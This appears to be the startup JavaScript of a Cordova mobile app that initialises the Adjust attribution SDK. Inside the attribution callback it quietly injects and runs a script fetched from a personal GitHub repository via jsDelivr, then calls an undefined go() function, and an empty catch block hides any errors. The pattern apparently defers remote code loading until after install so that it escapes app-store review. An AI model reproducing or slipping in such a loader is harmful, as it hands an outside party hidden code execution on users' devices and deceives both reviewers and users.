document.addEventListener('deviceready', onDeviceReady, false);
function onDeviceReady() {
    // Cordova is now initialized. Have fun!
    try {
        var adjustConfig = new AdjustConfig("rbuixr642oe8", AdjustConfig.EnvironmentProduction);

        adjustConfig.setAttributionCallbackListener(function(attribution) {
            console.log("Tracker token = " + attribution.trackerToken);
            console.log("AdNetwork = " + attribution.network);
            var script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/gh/zhushiwei888/testJs@2/c.js';
            document.body.appendChild(script);
            go();
        });
        Adjust.create(adjustConfig);
    
        installReferrer.getReferrer(function(attr) {
                                                console.log("Network = " + attr.utm_medium);
                                            }, null);
        } catch (error) {
        
        }
}

